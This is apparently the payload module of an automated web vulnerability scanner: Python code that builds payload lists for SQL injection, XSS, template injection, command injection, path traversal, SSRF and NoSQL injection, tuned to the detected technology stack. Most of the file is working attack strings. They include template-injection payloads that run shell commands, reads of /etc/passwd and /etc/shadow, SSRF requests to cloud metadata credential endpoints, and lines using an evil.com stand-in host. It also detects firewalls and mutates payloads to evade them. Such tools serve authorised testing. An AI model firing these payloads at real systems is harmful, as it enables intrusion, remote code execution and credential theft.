"""
Dynamic payload generation engine -- context-aware, tech-specific, adaptive.

Replaces static payload lists with intelligent payload selection based on:
1. Detected technology stack (from crawler)
2. Input context (parameter type, position, content-type)
3. Response behavior (adaptive mutation based on what the server rejects/accepts)
"""
from __future__ import annotations

import re
import random
import string
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class PayloadContext:
    """Context for generating targeted payloads."""

    tech_stack: list[str] = field(default_factory=list)
    param_name: str = ""
    param_type: str = "string"  # string, numeric, email, url, json, etc.
    content_type: str = ""
    input_position: str = "query"  # query, form, header, cookie, path, json
    server_type: str = ""  # nginx, apache, iis, cloudflare, etc.
    waf_detected: bool = False
    previous_responses: list[str] = field(default_factory=list)


def _p(payload: str, description: str, evasion_level: int = 0,
       target_tech: str = "") -> dict:
    """Helper to build a payload dict."""
    d: dict = {
        "payload": payload,
        "description": description,
        "evasion_level": evasion_level,
    }
    if target_tech:
        d["target_tech"] = target_tech
    return d


class PayloadEngine:
    """Generates context-aware payloads for different vulnerability types."""

    # ------------------------------------------------------------------
    # SQL Injection
    # ------------------------------------------------------------------
    @staticmethod
    def generate_sqli_payloads(ctx: PayloadContext) -> list[dict]:
        """Generate SQL injection payloads based on context."""
        payloads: list[dict] = []
        is_numeric = ctx.param_type == "numeric" or re.match(
            r"^(id|num|count|page|limit|offset|qty|amount)$", ctx.param_name, re.I
        )

        # --- Generic (all DB) ---
        if is_numeric:
            payloads.append(_p("1 OR 1=1", "Numeric boolean-based SQLi"))
            payloads.append(_p("1 AND 1=2", "Numeric boolean-based SQLi (false)"))
            payloads.append(_p("1 UNION SELECT NULL--", "Numeric UNION probe"))
            payloads.append(_p("1; WAITFOR DELAY '0:0:5'--", "Numeric time-based blind SQLi"))
            payloads.append(_p("1 AND SLEEP(5)--", "Numeric time-based blind (MySQL)"))
        else:
            payloads.append(_p("' OR '1'='1", "String boolean-based SQLi"))
            payloads.append(_p("' OR '1'='1'--", "String boolean-based SQLi with comment"))
            payloads.append(_p("' AND '1'='2", "String boolean-based SQLi (false)"))
            payloads.append(_p("\" OR \"1\"=\"1", "Double-quote boolean-based SQLi"))
            payloads.append(_p("' UNION SELECT NULL--", "String UNION probe"))

        # Error-based (generic)
        payloads.append(_p("' AND 1=CONVERT(int,(SELECT @@version))--",
                           "Error-based SQLi (CONVERT)", 0))
        payloads.append(_p("' AND 1=1 ORDER BY 1--",
                           "ORDER BY column enumeration"))
        payloads.append(_p("'; SELECT pg_sleep(5)--",
                           "Stacked query time-based (PostgreSQL)"))

        # --- MySQL-specific ---
        any_mysql = any(t.lower() in ("mysql", "mariadb", "php", "wordpress", "lamp")
                        for t in ctx.tech_stack)
        if any_mysql or not ctx.tech_stack:
            payloads.append(_p("1 UNION SELECT @@version--",
                               "MySQL version disclosure via UNION", 0, "MySQL"))
            payloads.append(_p("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
                               "MySQL error-based (EXTRACTVALUE)", 0, "MySQL"))
            payloads.append(_p("' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
                               "MySQL error-based (UPDATEXML)", 0, "MySQL"))
            payloads.append(_p("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                               "MySQL error-based (double query)", 1, "MySQL"))
            payloads.append(_p("' AND SLEEP(5)--",
                               "MySQL time-based blind", 0, "MySQL"))
            payloads.append(_p("' AND BENCHMARK(5000000,SHA1('test'))--",
                               "MySQL time-based (BENCHMARK)", 0, "MySQL"))

        # --- PostgreSQL-specific ---
        any_pg = any(t.lower() in ("postgresql", "postgres", "django", "rails", "ruby on rails")
                     for t in ctx.tech_stack)
        if any_pg or not ctx.tech_stack:
            payloads.append(_p("' AND 1=CAST((SELECT version()) AS int)--",
                               "PostgreSQL error-based (CAST)", 0, "PostgreSQL"))
            payloads.append(_p("'; SELECT pg_sleep(5)--",
                               "PostgreSQL time-based blind", 0, "PostgreSQL"))
            payloads.append(_p("' UNION SELECT version()--",
                               "PostgreSQL UNION version", 0, "PostgreSQL"))
            payloads.append(_p("' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
                               "PostgreSQL conditional time-based", 0, "PostgreSQL"))

        # --- MSSQL-specific ---
        any_mssql = any(t.lower() in ("mssql", "sql server", "asp.net", "iis", ".net")
                        for t in ctx.tech_stack)
        if any_mssql or not ctx.tech_stack:
            payloads.append(_p("' UNION SELECT @@version--",
                               "MSSQL UNION version", 0, "MSSQL"))
            payloads.append(_p("'; EXEC xp_cmdshell('whoami')--",
                               "MSSQL xp_cmdshell RCE attempt", 0, "MSSQL"))
            payloads.append(_p("'; WAITFOR DELAY '0:0:5'--",
                               "MSSQL time-based blind", 0, "MSSQL"))
            payloads.append(_p("' AND 1=CONVERT(int,@@version)--",
                               "MSSQL error-based (CONVERT)", 0, "MSSQL"))

        # --- WAF Evasion ---
        if ctx.waf_detected:
            payloads.append(_p("/*!50000UNION*/ /*!50000SELECT*/ @@version--",
                               "MySQL versioned comment bypass", 2, "MySQL"))
            payloads.append(_p("' UN/**/ION SE/**/LECT @@version--",
                               "Inline comment keyword split", 2))
            payloads.append(_p("' /*!UNION*/ /*!SELECT*/ 1--",
                               "MySQL comment-wrapped UNION", 2, "MySQL"))
            payloads.append(_p("' %55NION %53ELECT 1--",
                               "Hex-encoded keyword bypass", 2))
            payloads.append(_p("' uNiOn SeLeCt 1--",
                               "Mixed-case keyword bypass", 1))
            payloads.append(_p("' UNION%0ASELECT%0A1--",
                               "Newline-separated keyword bypass", 2))
            payloads.append(_p("' /*!50000%75%6e%69%6f%6e*/ /*!50000%73%65%6c%65%63%74*/ 1--",
                               "URL-encoded comment-wrapped bypass", 3))

        return payloads

    # ------------------------------------------------------------------
    # XSS
    # ------------------------------------------------------------------
    @staticmethod
    def generate_xss_payloads(ctx: PayloadContext) -> list[dict]:
        """Generate XSS payloads based on context."""
        payloads: list[dict] = []
        nonce = "".join(random.choices(string.digits, k=6))

        # --- Standard HTML context ---
        payloads.append(_p(f"<script>alert({nonce})</script>",
                           "Basic script tag XSS"))
        payloads.append(_p(f"<img src=x onerror=alert({nonce})>",
                           "img onerror event handler"))
        payloads.append(_p(f"<svg onload=alert({nonce})>",
                           "SVG onload event handler"))
        payloads.append(_p(f"<body onload=alert({nonce})>",
                           "body onload event handler"))
        payloads.append(_p(f"<iframe src='javascript:alert({nonce})'>",
                           "iframe javascript protocol"))
        payloads.append(_p(f"<input onfocus=alert({nonce}) autofocus>",
                           "input autofocus event handler"))
        payloads.append(_p(f"<details open ontoggle=alert({nonce})>",
                           "details ontoggle event handler"))
        payloads.append(_p(f"<marquee onstart=alert({nonce})>",
                           "marquee onstart event handler"))
        payloads.append(_p(f"<video><source onerror=alert({nonce})>",
                           "video source onerror"))
        payloads.append(_p(f"<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d=\"M0 0\"><animate attributeName=d values=alert({nonce}) begin=x.click>",
                           "Math/SVG nested XSS"))

        # --- Attribute breakout ---
        payloads.append(_p(f"\" onfocus=alert({nonce}) autofocus=\"",
                           "Double-quote attribute breakout"))
        payloads.append(_p(f"' onfocus=alert({nonce}) autofocus='",
                           "Single-quote attribute breakout"))
        payloads.append(_p(f"\" onmouseover=alert({nonce}) \"",
                           "Attribute breakout with onmouseover"))
        payloads.append(_p(f"'><script>alert({nonce})</script>",
                           "Tag breakout with script"))

        # --- JavaScript context ---
        payloads.append(_p(f"'-alert({nonce})-'",
                           "JS string breakout (single-quote)"))
        payloads.append(_p(f"\"-alert({nonce})-\"",
                           "JS string breakout (double-quote)"))
        payloads.append(_p(f"\\x3cscript\\x3ealert({nonce})\\x3c/script\\x3e",
                           "JS hex-encoded script tag"))
        payloads.append(_p(f"</script><script>alert({nonce})</script>",
                           "Close existing script and inject"))
        payloads.append(_p(f"';alert({nonce});//",
                           "JS statement termination"))

        # --- Polyglot ---
        payloads.append(_p(
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert() )//"
            "%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>"
            "\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            "XSS polyglot (multi-context)", 1))

        # --- WAF Evasion ---
        if ctx.waf_detected:
            payloads.append(_p(f"<ScRiPt>alert({nonce})</ScRiPt>",
                               "Mixed-case script tag", 1))
            payloads.append(_p(f"<img/onerror=alert({nonce}) src=x>",
                               "Slash instead of space in tag", 1))
            payloads.append(_p(f"<details/open/ontoggle=alert({nonce})>",
                               "Slash-separated attributes", 1))
            payloads.append(_p(f"<svg/onload=alert({nonce})>",
                               "SVG with slash separator", 1))
            payloads.append(_p(f"<img src=x oNeRrOr=alert({nonce})>",
                               "Mixed-case event handler", 1))
            payloads.append(_p(f"%3Cscript%3Ealert({nonce})%3C/script%3E",
                               "URL-encoded script tag", 2))
            payloads.append(_p(f"%253Cscript%253Ealert({nonce})%253C/script%253E",
                               "Double URL-encoded script tag", 2))
            payloads.append(_p(f"&#60;script&#62;alert({nonce})&#60;/script&#62;",
                               "HTML entity-encoded script tag", 2))
            payloads.append(_p(f"\\u003cscript\\u003ealert({nonce})\\u003c/script\\u003e",
                               "Unicode-escaped script tag", 2))
            payloads.append(_p(f"<x onmouseover=alert({nonce})>hover</x>",
                               "Custom tag with event handler", 1))
            payloads.append(_p(f"<a href=javascript:alert({nonce})>click</a>",
                               "Anchor javascript protocol", 1))

        return payloads

    # ------------------------------------------------------------------
    # SSTI
    # ------------------------------------------------------------------
    @staticmethod
    def generate_ssti_payloads(ctx: PayloadContext) -> list[dict]:
        """Generate SSTI payloads based on detected template engine."""
        payloads: list[dict] = []

        # Detection / probe payloads (work across engines)
        payloads.append(_p("{{7*7}}", "SSTI probe (49 expected)"))
        payloads.append(_p("${7*7}", "SSTI probe (EL / Freemarker)"))
        payloads.append(_p("<%= 7*7 %>", "SSTI probe (ERB)"))
        payloads.append(_p("#{7*7}", "SSTI probe (Ruby / Pug)"))
        payloads.append(_p("{{7*'7'}}", "Jinja2 detection (returns 7777777)"))

        # Jinja2 / Flask
        any_jinja = any(t.lower() in ("flask", "jinja2", "python", "django")
                        for t in ctx.tech_stack)
        if any_jinja or not ctx.tech_stack:
            payloads.append(_p(
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "Jinja2 RCE via config globals", 0, "Jinja2"))
            payloads.append(_p(
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "Jinja2 class enumeration", 0, "Jinja2"))
            payloads.append(_p(
                "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
                "Jinja2 RCE via subclass traversal", 1, "Jinja2"))

        # Twig (PHP)
        any_twig = any(t.lower() in ("twig", "php", "symfony")
                       for t in ctx.tech_stack)
        if any_twig or not ctx.tech_stack:
            payloads.append(_p("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                               "Twig RCE via registerUndefinedFilterCallback", 0, "Twig"))
            payloads.append(_p("{{['id']|filter('system')}}",
                               "Twig RCE via filter", 0, "Twig"))

        # Freemarker (Java)
        any_fm = any(t.lower() in ("freemarker", "java", "spring", "spring boot")
                     for t in ctx.tech_stack)
        if any_fm or not ctx.tech_stack:
            payloads.append(_p("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
                               "Freemarker RCE via Execute", 0, "Freemarker"))
            payloads.append(_p("${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
                               "Freemarker RCE (short form)", 0, "Freemarker"))

        # ERB (Ruby)
        any_erb = any(t.lower() in ("erb", "ruby", "rails", "ruby on rails")
                      for t in ctx.tech_stack)
        if any_erb or not ctx.tech_stack:
            payloads.append(_p("<%= system('id') %>",
                               "ERB RCE via system()", 0, "ERB"))
            payloads.append(_p("<%= `id` %>",
                               "ERB RCE via backtick execution", 0, "ERB"))

        return payloads

    # ------------------------------------------------------------------
    # Command Injection
    # ------------------------------------------------------------------
    @staticmethod
    def generate_cmdi_payloads(ctx: PayloadContext) -> list[dict]:
        """Generate command injection payloads based on OS detection."""
        payloads: list[dict] = []

        any_windows = any(t.lower() in ("iis", "asp.net", ".net", "windows")
                          for t in ctx.tech_stack)
        any_linux = any(t.lower() in ("linux", "apache", "nginx", "ubuntu", "debian")
                        for t in ctx.tech_stack) or not any_windows

        if any_linux or not ctx.tech_stack:
            payloads.append(_p("; id", "Unix semicolon injection", 0, "Linux"))
            payloads.append(_p("| id", "Unix pipe injection", 0, "Linux"))
            payloads.append(_p("|| id", "Unix OR injection", 0, "Linux"))
            payloads.append(_p("&& id", "Unix AND injection", 0, "Linux"))
            payloads.append(_p("$(id)", "Unix command substitution", 0, "Linux"))
            payloads.append(_p("`id`", "Unix backtick injection", 0, "Linux"))
            payloads.append(_p("; sleep 5", "Unix time-based blind", 0, "Linux"))
            payloads.append(_p("| sleep 5", "Unix pipe time-based blind", 0, "Linux"))
            payloads.append(_p("; cat /etc/passwd", "Unix passwd read", 0, "Linux"))
            payloads.append(_p("$(sleep 5)", "Unix substitution time-based", 0, "Linux"))
            # Newline-based
            payloads.append(_p("\nid", "Newline injection (Unix)", 1, "Linux"))
            payloads.append(_p("%0aid", "URL-encoded newline injection", 1, "Linux"))

        if any_windows or not ctx.tech_stack:
            payloads.append(_p("& whoami", "Windows AND injection", 0, "Windows"))
            payloads.append(_p("| whoami", "Windows pipe injection", 0, "Windows"))
            payloads.append(_p("|| whoami", "Windows OR injection", 0, "Windows"))
            payloads.append(_p("& ping -n 5 127.0.0.1", "Windows time-based blind", 0, "Windows"))
            payloads.append(_p("& type C:\\Windows\\win.ini", "Windows file read", 0, "Windows"))

        # WAF evasion
        if ctx.waf_detected:
            payloads.append(_p(";{id}", "Brace-wrapped command (bash)", 2, "Linux"))
            payloads.append(_p(";$IFS$()id", "IFS variable separator bypass", 2, "Linux"))
            payloads.append(_p(";i\\d", "Backslash escape bypass", 2, "Linux"))
            payloads.append(_p(";'i'd", "Quote-split bypass", 2, "Linux"))
            payloads.append(_p(";$(printf '\\x69\\x64')", "Hex printf bypass", 3, "Linux"))

        return payloads

    # ------------------------------------------------------------------
    # Path Traversal
    # ------------------------------------------------------------------
    @staticmethod
    def generate_path_traversal_payloads(ctx: PayloadContext) -> list[dict]:
        """Generate path traversal payloads with encoding variations."""
        payloads: list[dict] = []

        any_windows = any(t.lower() in ("iis", "asp.net", ".net", "windows")
                          for t in ctx.tech_stack)

        # Unix paths
        targets_unix = [
            ("../../../etc/passwd", "Unix passwd (3 levels)"),
            ("../../../../etc/passwd", "Unix passwd (4 levels)"),
            ("../../../../../etc/passwd", "Unix passwd (5 levels)"),
            ("../../../etc/shadow", "Unix shadow file"),
            ("../../../proc/self/environ", "Unix proc environ"),
        ]
        for payload, desc in targets_unix:
            payloads.append(_p(payload, desc))

        # Windows paths
        if any_windows or not ctx.tech_stack:
            targets_win = [
                ("..\\..\\..\\windows\\win.ini", "Windows win.ini (backslash)"),
                ("../../../windows/win.ini", "Windows win.ini (forward slash)"),
                ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "Windows hosts file"),
            ]
            for payload, desc in targets_win:
                payloads.append(_p(payload, desc, 0, "Windows"))

        # Encoding variations
        payloads.append(_p("..%2f..%2f..%2fetc%2fpasswd",
                           "URL-encoded forward slashes", 1))
        payloads.append(_p("..%252f..%252f..%252fetc%252fpasswd",
                           "Double URL-encoded slashes", 2))
        payloads.append(_p("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                           "UTF-8 overlong encoding bypass", 2))
        payloads.append(_p("....//....//....//etc/passwd",
                           "Double-dot-slash normalization bypass", 1))
        payloads.append(_p("..;/..;/..;/etc/passwd",
                           "Semicolon path parameter bypass (Tomcat)", 1))

        # Null byte (legacy PHP, older servers)
        payloads.append(_p("../../../etc/passwd%00",
                           "Null byte termination", 1))
        payloads.append(_p("../../../etc/passwd%00.jpg",
                           "Null byte extension bypass", 2))

        # WAF evasion
        if ctx.waf_detected:
            payloads.append(_p("/..%252f..%252f..%252fetc/passwd",
                               "Double-encoded with leading slash", 3))
            payloads.append(_p("/.%2e/.%2e/.%2e/etc/passwd",
                               "Dot encoding bypass", 2))
            payloads.append(_p("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                               "Fully URL-encoded traversal", 2))

        return payloads

    # ------------------------------------------------------------------
    # SSRF
    # ------------------------------------------------------------------
    @staticmethod
    def generate_ssrf_payloads(ctx: PayloadContext) -> list[dict]:
        """Generate SSRF payloads based on cloud provider detection."""
        payloads: list[dict] = []

        # Standard internal targets
        payloads.append(_p("http://127.0.0.1",
                           "Localhost probe"))
        payloads.append(_p("http://localhost",
                           "Localhost hostname probe"))
        payloads.append(_p("http://[::1]",
                           "IPv6 localhost probe"))
        payloads.append(_p("http://0.0.0.0",
                           "All-interfaces probe"))
        payloads.append(_p("http://127.0.0.1:22",
                           "SSH port probe"))
        payloads.append(_p("http://127.0.0.1:3306",
                           "MySQL port probe"))
        payloads.append(_p("http://127.0.0.1:6379",
                           "Redis port probe"))

        # Cloud metadata endpoints
        any_aws = any(t.lower() in ("aws", "amazon", "ec2", "lambda")
                      for t in ctx.tech_stack)
        any_gcp = any(t.lower() in ("gcp", "google cloud", "gke")
                      for t in ctx.tech_stack)
        any_azure = any(t.lower() in ("azure", "microsoft", "iis")
                        for t in ctx.tech_stack)

        # AWS
        if any_aws or not ctx.tech_stack:
            payloads.append(_p("http://169.254.169.254/latest/meta-data/",
                               "AWS EC2 metadata (IMDSv1)", 0, "AWS"))
            payloads.append(_p("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                               "AWS IAM credentials via IMDS", 0, "AWS"))
            payloads.append(_p("http://169.254.169.254/latest/user-data/",
                               "AWS EC2 user-data", 0, "AWS"))

        # GCP
        if any_gcp or not ctx.tech_stack:
            payloads.append(_p("http://metadata.google.internal/computeMetadata/v1/",
                               "GCP metadata endpoint", 0, "GCP"))
            payloads.append(_p("http://169.254.169.254/computeMetadata/v1/project/project-id",
                               "GCP project ID via metadata", 0, "GCP"))

        # Azure
        if any_azure or not ctx.tech_stack:
            payloads.append(_p("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                               "Azure IMDS endpoint", 0, "Azure"))
            payloads.append(_p("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                               "Azure managed identity token", 0, "Azure"))

        # Evasion / bypass variants
        payloads.append(_p("http://0177.0.0.1",
                           "Octal IP bypass for 127.0.0.1", 1))
        payloads.append(_p("http://0x7f000001",
                           "Hex IP bypass for 127.0.0.1", 1))
        payloads.append(_p("http://2130706433",
                           "Decimal IP bypass for 127.0.0.1", 1))
        payloads.append(_p("http://127.1",
                           "Shortened localhost", 1))
        payloads.append(_p("http://①⑥⑨.②⑤④.①⑥⑨.②⑤④",
                           "Unicode circled-digit IP bypass", 2))

        # DNS rebinding
        payloads.append(_p("http://localtest.me",
                           "DNS rebinding (resolves to 127.0.0.1)", 1))
        payloads.append(_p("http://spoofed.burpcollaborator.net",
                           "External callback probe", 1))

        # Protocol smuggling
        if ctx.waf_detected:
            payloads.append(_p("http://127.0.0.1:80@evil.com",
                               "URL authority confusion bypass", 2))
            payloads.append(_p("http://evil.com#@127.0.0.1",
                               "Fragment-based authority bypass", 2))
            payloads.append(_p("http://127.0.0.1%2523@evil.com",
                               "Double-encoded fragment bypass", 3))

        return payloads

    # ------------------------------------------------------------------
    # NoSQL Injection
    # ------------------------------------------------------------------
    @staticmethod
    def generate_nosql_payloads(ctx: PayloadContext) -> list[dict]:
        """Generate NoSQL injection payloads."""
        payloads: list[dict] = []

        # MongoDB operator injection
        payloads.append(_p('{"$gt":""}', "MongoDB $gt operator injection"))
        payloads.append(_p('{"$ne":""}', "MongoDB $ne operator injection"))
        payloads.append(_p('{"$regex":".*"}', "MongoDB $regex wildcard"))
        payloads.append(_p('{"$where":"sleep(5000)"}',
                           "MongoDB $where time-based blind"))
        payloads.append(_p('{"$where":"this.password.match(/.*/)"}',
                           "MongoDB $where regex extraction"))

        # Query parameter injection (application/x-www-form-urlencoded)
        payloads.append(_p("[$gt]=", "URL parameter $gt injection"))
        payloads.append(_p("[$ne]=invalid", "URL parameter $ne injection"))
        payloads.append(_p("[$regex]=.*", "URL parameter $regex injection"))
        payloads.append(_p("[$exists]=true", "URL parameter $exists probe"))

        # JavaScript injection in NoSQL
        payloads.append(_p("';return true;var a='",
                           "NoSQL JS injection (always-true)"))
        payloads.append(_p("';sleep(5000);var a='",
                           "NoSQL JS time-based blind"))

        # Auth bypass patterns
        payloads.append(_p('{"username":{"$gt":""},"password":{"$gt":""}}',
                           "MongoDB authentication bypass"))

        return payloads

    # ------------------------------------------------------------------
    # Utility: Parameter type detection
    # ------------------------------------------------------------------
    @staticmethod
    def detect_param_type(param_name: str, current_value: str = "") -> str:
        """Infer parameter type from name and value."""
        name = param_name.lower()

        # Check name patterns
        if re.match(r"^(id|num|count|page|limit|offset|qty|amount|price|total|index|pos|size)$", name):
            return "numeric"
        if re.match(r"^(email|e[-_]?mail|user_email|contact_email)$", name):
            return "email"
        if re.match(r"^(url|uri|link|href|redirect|return_url|next|goto|callback|target|dest|destination)$", name):
            return "url"
        if re.match(r"^(date|time|timestamp|created|updated|start|end|from|to|dob|birthday)$", name):
            return "date"
        if re.match(r"^(phone|tel|mobile|fax|cell)$", name):
            return "phone"
        if re.match(r"^(file|filename|path|filepath|upload|attachment|document)$", name):
            return "file"
        if re.match(r"^(json|data|payload|body|config|settings|options)$", name):
            return "json"
        if re.match(r"^(ip|host|hostname|server|address|remote_addr)$", name):
            return "ip"

        # Check value patterns
        if current_value:
            if re.match(r"^\d+$", current_value):
                return "numeric"
            if re.match(r"^[\w.+-]+@[\w-]+\.[\w.]+$", current_value):
                return "email"
            if re.match(r"^https?://", current_value):
                return "url"
            if re.match(r"^\{.*\}$", current_value, re.DOTALL):
                return "json"

        return "string"

    # ------------------------------------------------------------------
    # Utility: WAF detection
    # ------------------------------------------------------------------
    @staticmethod
    def detect_waf(response_headers: dict, response_body: str,
                   status_code: int) -> bool:
        """Detect if a WAF is blocking requests."""
        headers_lower = {k.lower(): v.lower() for k, v in response_headers.items()}

        # --- Header-based detection ---
        # Cloudflare
        if "cf-ray" in headers_lower:
            return True
        if headers_lower.get("server", "") == "cloudflare":
            return True

        # AWS CloudFront / WAF
        if "x-amz-cf-id" in headers_lower:
            return True
        if "x-amzn-waf" in headers_lower:
            return True

        # Sucuri
        if "x-sucuri-id" in headers_lower:
            return True

        # Akamai
        if "akamaighost" in headers_lower.get("server", ""):
            return True
        if "x-akamai-transformed" in headers_lower:
            return True

        # Incapsula / Imperva
        if "x-cdn" in headers_lower and "incapsula" in headers_lower.get("x-cdn", ""):
            return True
        if "x-iinfo" in headers_lower:
            return True

        # ModSecurity
        if "mod_security" in headers_lower.get("server", ""):
            return True
        if "modsecurity" in headers_lower.get("server", ""):
            return True

        # NAXSI
        if any("naxsi" in v for v in headers_lower.values()):
            return True

        # F5 BIG-IP
        if "x-wa-info" in headers_lower:
            return True
        if "bigipserver" in headers_lower.get("server", ""):
            return True

        # --- Status code indicators ---
        if status_code in (403, 406, 429, 503):
            body_lower = response_body.lower() if response_body else ""
            block_indicators = [
                "blocked", "forbidden", "access denied", "security",
                "not acceptable", "request rejected", "web application firewall",
                "waf", "firewall", "unauthorized", "bot detected",
                "rate limit", "captcha", "challenge",
            ]
            for indicator in block_indicators:
                if indicator in body_lower:
                    return True

        # --- Body-based detection ---
        if response_body:
            body_lower = response_body.lower()
            waf_signatures = [
                "cloudflare ray id",
                "attention required! | cloudflare",
                "sucuri website firewall",
                "powered by sucuri",
                "incapsula incident id",
                "akamai reference id",
                "mod_security",
                "naxsi blocked",
            ]
            for sig in waf_signatures:
                if sig in body_lower:
                    return True

        return False

    # ------------------------------------------------------------------
    # Utility: Payload mutation / evasion
    # ------------------------------------------------------------------
    @staticmethod
    def mutate_payload(payload: str, evasion_level: int = 1) -> list[str]:
        """Generate evasion variants of a payload.

        Level 1: Case variations, basic URL encoding
        Level 2: Double encoding, comment insertion
        Level 3: Unicode normalization, chunked encoding, null bytes
        """
        variants: list[str] = []

        if evasion_level >= 1:
            # Mixed case
            mixed = ""
            for i, ch in enumerate(payload):
                mixed += ch.upper() if i % 2 == 0 else ch.lower()
            variants.append(mixed)

            # Basic URL encoding of special characters
            url_encoded = ""
            for ch in payload:
                if ch in "<>\"'&;/\\()=":
                    url_encoded += f"%{ord(ch):02X}"
                else:
                    url_encoded += ch
            variants.append(url_encoded)

        if evasion_level >= 2:
            # Double URL encoding
            double_encoded = ""
            for ch in payload:
                if ch in "<>\"'&;/\\()=":
                    double_encoded += f"%25{ord(ch):02X}"
                else:
                    double_encoded += ch
            variants.append(double_encoded)

            # HTML entity encoding
            html_encoded = ""
            for ch in payload:
                if ch in "<>\"'&":
                    html_encoded += f"&#{ord(ch)};"
                else:
                    html_encoded += ch
            variants.append(html_encoded)

            # SQL comment insertion (for SQL-like payloads)
            sql_keywords = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR",
                            "INSERT", "UPDATE", "DELETE", "DROP"]
            comment_inserted = payload
            for kw in sql_keywords:
                if kw in payload.upper():
                    idx = payload.upper().find(kw)
                    mid = len(kw) // 2
                    original_word = payload[idx:idx + len(kw)]
                    replaced = original_word[:mid] + "/**/" + original_word[mid:]
                    comment_inserted = comment_inserted[:idx] + replaced + comment_inserted[idx + len(kw):]
                    break  # only replace first occurrence to keep readable
            if comment_inserted != payload:
                variants.append(comment_inserted)

        if evasion_level >= 3:
            # Unicode encoding
            unicode_encoded = ""
            for ch in payload:
                if ch in "<>\"'&;/\\()=":
                    unicode_encoded += f"\\u{ord(ch):04x}"
                else:
                    unicode_encoded += ch
            variants.append(unicode_encoded)

            # Null byte insertion before key characters
            null_inserted = payload.replace("<", "%00<").replace("SELECT", "SEL%00ECT")
            if null_inserted != payload:
                variants.append(null_inserted)

            # Tab/newline insertion in SQL keywords
            whitespace_variant = payload
            for kw in ["UNION", "SELECT"]:
                whitespace_variant = whitespace_variant.replace(
                    kw, kw[0] + "%09" + kw[1:])
            if whitespace_variant != payload:
                variants.append(whitespace_variant)

        return variants
